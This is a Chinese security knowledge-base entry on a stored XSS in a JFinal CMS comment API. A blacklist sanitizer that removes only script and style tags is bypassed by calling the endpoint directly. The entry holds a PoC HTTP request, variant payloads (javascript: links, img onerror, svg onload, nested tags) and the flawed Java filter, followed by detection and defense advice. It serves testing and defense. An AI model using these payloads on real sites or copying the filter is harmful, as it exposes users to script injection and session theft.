---
id: web-generic-xss-backend-script-style-blacklist-api-bypass
title: 后端 delScriptTag 仅删 script/style，直连接口绕过前端实体编码导致存储型 XSS
type: scenario
domain: web
path: web/generic/xss
technique: blacklist-sanitizer-direct-api-bypass
tags:
- xss
- stored-xss
- sanitizer-bypass
- blacklist
- jfinal
- java
- direct-api
- javascript-uri
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V11
  verified_at: '2026-11-05T01:20:06+08:00'
  notes: 已对照原文及图10-15核对：saveComment 仅调用 JFlyFoxUtils.delScriptTag（只删 script/style），UI 提交被实体编码，直连 model.content=<a href=javascript:alert(1)>test</a> 原样入库并渲染。PoC 中 delScriptTag 为等价简化写法（原文用 Pattern.compile 标志位2）；原文称已触发XSS，未展示CSP/浏览器拦截细节。
url: /docs/web/generic/xss/web-generic-xss-backend-script-style-blacklist-api-bypass/
draft: false
kb_aliases:
- delScriptTag 绕过
- 只过滤 script 标签 XSS
- 直连接口绕过前端编码
- JFinal 存储型 XSS
- javascript: href 存储 XSS
---

## 一句话结论

评论接口的服务端清洗函数 `delScriptTag` 只删除 `<script>` 与 `<style>` 标签，前端又仅做了提交时的实体编码；攻击者直接用接口提交 `<a href=javascript:alert(1)>` 或其他事件标签即可绕过两者，评论被原样存储并在页面渲染，形成存储型 XSS。

## 原理

- 后端 `JFlyFoxUtils.delScriptTag` 用两条正则分别删除 `<script...>...</script>` 和 `<style...>...</style>`，除此之外不做 HTML 转义、不做标签/属性白名单。
- 因此 `<img src=x onerror=...>`、`<svg onload=...>`、`<a href="javascript:...">`、`<iframe srcdoc=...>` 等标签和危险属性全部保留；黑名单只覆盖两个标签，必然存在大量绕过。
- 前端页面在表单提交时对内容做了 HTML 实体编码（界面提交 `<h1>test</h1>` 存储为 `&lt;h1&gt;test&lt;/h1&gt;`），这只能防住“通过 UI 提交”的路径；攻击者直接构造 HTTP 请求调用保存接口，跳过前端 JS，服务端只看到原始标签并原样入库。
- 评论内容在列表页未做输出编码，按 HTML 渲染，存储的 `<a href=javascript:...>` 被点击时执行脚本；若换成自动触发标签（`img onerror`）则无需交互。
- 根因组合：**客户端编码不是安全边界** + **服务端黑名单清洗覆盖不全** + **输出未转义**。

## 触发条件

- 存在允许登录用户提交富文本/评论的接口，内容会持久化并在页面展示；
- 服务端只用“删除 script/style”的黑名单清洗，未使用 HTML 白名单 sanitizer 或输出编码；
- 接口可直接调用（有会话 Cookie 即可），不依赖前端表单加密/编码；
- 展示页面按 HTML 渲染评论，且 CSP 未禁止内联事件/javascript: URL。

## 利用步骤

1. 登录后抓取评论保存请求，记录 URL、Cookie 与参数名（本例 `model.content`、`model.article_id`、`model.reply_userid` 等）。
2. 在 UI 提交 `<h1>test</h1>`，观察响应中是否被实体编码（`&lt;h1&gt;`），确认前端存在编码。
3. 用 Burp/curl 直接重放，把 `model.content` 改为不被黑名单覆盖的 payload，如 `<a href=javascript:alert(1)>test</a>`。
4. 响应中 `content` 原样返回 payload，说明已存储；刷新评论列表，点击链接触发；或改用 `<img src=x onerror=alert(1)>` 自动触发。
5. 若页面有 CSP，改用不被拦截的向量或寻找允许的内联事件。

## PoC

```http
POST /jfinal_cms/front/comment/save HTTP/1.1
Host: target:8089
Content-Type: application/x-www-form-urlencoded
Cookie: JSESSIONID=...

model.content=%3Ca%20href%3Djavascript%3Aalert(1)%3Etest%3C%2Fa%3E&model.article_id=4252&model.reply_userid=0&model.create_id=1&model.fatherId=0
```

响应（服务端原样存储）：

```json
{
  "reply_userid": 1,
  "create_id": 1,
  "comment_id": 7,
  "content": "<a href=javascript:alert(1)>test</a>",
  "status": 1,
  "create_name": "系统管理员"
}
```

黑名单函数逻辑（被绕过的原因）：

```java
public static String delScriptTag(String htmlStr) {
    htmlStr = htmlStr.replaceAll("<script[^>]*?>[\\s\\S]*?<\\/script>", "");
    htmlStr = htmlStr.replaceAll("<style[^>]*?>[\\s\\S]*?<\\/style>", "");
    return htmlStr.trim();
}
```

## 变体与关联

- 变体：`<img src=x onerror=alert(1)>`、`<svg onload=...>`、`<iframe srcdoc=...>`、`<body onresize=...>`；`<a href=javascript:...>` 需点击，事件标签可自动触发。
- 变体：大小写/嵌套/编码绕过正则，如 `<scr<script>ipt>`（若过滤单次替换）、`&#x6a;avascript:`。
- 关联：[[web-generic-xss-scriptless-execution-vectors]]（无 script 标签的通用载体）；[[web-generic-xss-filter-bypass-encoding-obfuscation]]（黑名单/编码绕过）；[[web-generic-xss-nonglobal-replace-first-match-bypass]]（前端 escapeHTML 覆盖不全）。
- 注意：原文展示了 UI 实体编码与直连接口绕过，并称触发 XSS；未给出 CSP/浏览器拦截情况。

## 检测与防御

- 检测：代码审计搜索 `delScriptTag`、`replaceAll("<script"`、黑名单式 sanitizer；评论内容入库前只做了 script/style 删除。
- 检测：请求体中出现 `model.content` 含 `<`、`javascript:`、`onerror=` 等原始标签/属性；响应回显相同内容。
- 防御：服务端使用 HTML 白名单 sanitizer（OWASP Java HTML Sanitizer、jsoup Safelist），按标签/属性/URL 协议白名单放行；不要依赖前端编码。
- 防御：输出到 HTML 时按上下文编码（`<c:out>`/`escapeHtml`），富文本用 sanitizer 后再渲染。
- 防御：部署 CSP，禁止 `unsafe-inline` 与 `javascript:` URL；Cookie 设置 HttpOnly 降低会话窃取影响。
